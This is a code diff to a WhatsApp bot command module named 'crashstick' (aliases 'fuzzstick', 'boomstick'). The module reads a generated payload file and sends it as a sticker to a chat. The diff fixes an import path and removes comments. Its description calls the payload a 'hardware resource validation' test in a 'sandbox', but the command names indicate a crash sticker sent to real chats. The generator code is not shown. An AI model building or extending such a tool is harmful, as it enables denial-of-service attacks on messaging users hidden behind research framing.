@@ -1,13 +1,14 @@
 const fs = require('fs');
 const path = require('path');
-const { generateTestPayload } = require('../utils/generatePayload');
+// CHANGE '../utils/generatePayload' TO '../../utils/generatePayload'
+const { generateTestPayload } = require('../../utils/generatePayload');
 
 module.exports = {
   name: 'crashstick',
   aliases: ['fuzzstick', 'boomstick'],
   category: 'RESEARCH',
   description: 'Deploys a heavy hardware resource validation payload to the sandbox.',
-  access: 'owner', // Enforce owner scope restriction for safety
+  access: 'owner',
 
   /**
    * @param {object} sock Baileys socket
@@ -27,13 +28,12 @@ module.exports = {
 
       const stickerBuffer = fs.readFileSync(payloadPath);
 
-      // Send utilizing native Baileys direct transport layer properties
       await sock.sendMessage(m.chatJid, { 
         sticker: stickerBuffer 
       });
 
     } catch (error) {
-      throw error; // Let the core registry logger catch and display the stack cleanly
+      throw error;
     }
   }
 };
